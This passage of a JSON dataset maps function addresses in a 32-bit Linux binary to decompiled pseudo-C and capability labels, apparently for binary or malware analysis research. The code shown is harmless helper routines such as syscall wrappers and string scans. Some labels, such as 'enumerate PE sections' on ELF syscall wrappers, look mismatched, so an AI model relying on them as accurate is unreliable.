1);\n        while( true ) {\n            if (arg_ch == cVar1) goto code_r0x080481f5;\n            uVar5 = uVar5 + 1;\n            if (uVar5 == var_10h) break;\n            ppcVar6 = (*0x80567a0)[uVar5];\n            cVar1 = *(ppcVar6 + 1);\n        }\n    } while( true );\n}\n",
        "token_count": 859
    },
    "0804ed18": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong fcn.0804ed18(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint uStack8;\n    \n    pcVar1 = swi(0x80);\n    uVar2 = (*pcVar1)();\n    if (0xfffff000 < uVar2) {\n        piVar3 = fcn.0804efb0();\n        *piVar3 = -uVar2;\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack8, uVar2);\n}\n",
        "token_count": 127
    },
    "0805031f": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0805031f(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack16 = param_1;\n    uStack12 = param_2;\n    uStack8 = param_3;\n    uStack4 = param_4;\n    fcn.08051e73(9, &uStack16);\n    return;\n}\n",
        "token_count": 111
    },
    "08051f12": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong fcn.08051f12(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint uStack8;\n    \n    pcVar1 = swi(0x80);\n    uVar2 = (*pcVar1)();\n    if (0xfffff000 < uVar2) {\n        piVar3 = fcn.0804efb0();\n        *piVar3 = -uVar2;\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack8, uVar2);\n}\n",
        "token_count": 127
    },
    "080533f0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong fcn.080533f0(int32_t param_1, uint *param_2, uint param_3)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint uStack12;\n    \n    iVar2 = fcn.08052254(*(param_1 + 4), *param_2, param_2[1], param_3);\n    uVar1 = iVar2;\n    if (-1 < iVar2) {\n        *param_2 = uVar1;\n        param_2[1] = iVar2 >> 0x20;\n        uVar1 = 0;\n    }\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 147
    },
    "08052808": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.08052808(uint *param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    if (param_2 == 0x100) {\n        *param_1 = param_3;\n    }\n    else if (param_2 == 0x800) {\n        *param_1 = param_3;\n        param_1[1] = param_4;\n    }\n    else if (param_2 == 0x200) {\n        *param_1 = param_3;\n    }\n    else {\n        *param_1 = param_3;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0804e5b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0804e5b0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        iVar1 = 0;\n        do {\n            *(iVar1 + param_1) = 0;\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "08053027": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.08053027(char *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    \n    do {\n        pcVar1 = param_2;\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        for (; *pcVar1 != '\\0'; pcVar1 = pcVar1 + 1) {\n            if (*pcVar1 == *param_1) {\n                return param_1;\n            }\n        }\n        param_1 = param_1 + 1;\n    } while( true );\n}\n",
        "token_count": 124
    },
    "08053486": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.08053486(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    while( true ) {\n        cVar1 = *param_1;\n        pcVar2 = param_2;\n        if (cVar1 == '\\0') {\n            return iVar3;\n        }\n        while( true ) {\n            if (*pcVar2 == '\\0') {\n                return iVar3;\n            }\n            if (cVar1 == *pcVar2) break;\n            pcVar2 = pcVar2 + 1;\n        }\n        if (cVar1 == '\\0') break;\n        iVar3 = iVar3 + 1;\n        param_1 = param_1 + 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 188
    }
}